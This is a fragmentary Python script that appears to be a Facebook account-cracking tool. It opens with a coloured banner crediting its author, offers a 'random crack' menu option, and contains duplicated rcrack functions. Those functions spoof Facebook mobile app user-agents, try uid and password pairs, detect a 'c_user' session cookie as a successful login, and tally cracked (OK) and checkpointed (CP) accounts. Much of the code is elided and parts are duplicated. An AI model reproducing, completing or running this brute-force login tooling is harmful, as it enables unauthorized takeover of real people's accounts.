...
\033[1;31m(•)=============================================🥀
\033[1;36m[•] \033[1;34mCREATED BY   : » \033[1;34mOWNER AHMED
\033[1;32m[•] \033[1;36mFACEBOK      : » \033[1;36mAHMED BALOUCH 
\033[1;37m[•] \033[1;37mGITHUB       : » \033[1;37mPRIVATE
\033[1;33m[•] \033[1;34mSTATUS       : » \033[1;34mTOOL IS On testing 
\033[1;35m[•] \033[1;36mBROTHER      : » \033[1;36m🤟🥰KAZIM☝️😍
\033[1;32m[•] \033[1;33mVERSION      : » \033[1;33m** TESTING 
\033[1;31m(•)=============================================💔\n\n"""  
loop = 0
oks = []
cps = []
...
def menu():
	...
	if opt =='1':
		random_crack()
	if opt =='2':
		os.system("xdg-open https://www.facebook.com/profile.php?id=100058243645491")
		menu()
    #if opt =='0':
    	#exit()
    #else:
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; POT-AL00a Build/HUAWEIPOT-AL00a; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/273.0.0.39.123;]',}
			...
			if 'c_user' in log_cookies:
				...
				print('\r\033[1;32m[AHMUU -OK] '+uid+' | '+ps)
		...
		sys.stdout.write('\r\33[1;37m[OP-AHMUU] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',}
		...
		sys.stdout.write('\r\33[1;37m[AHMUUU-🥰] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
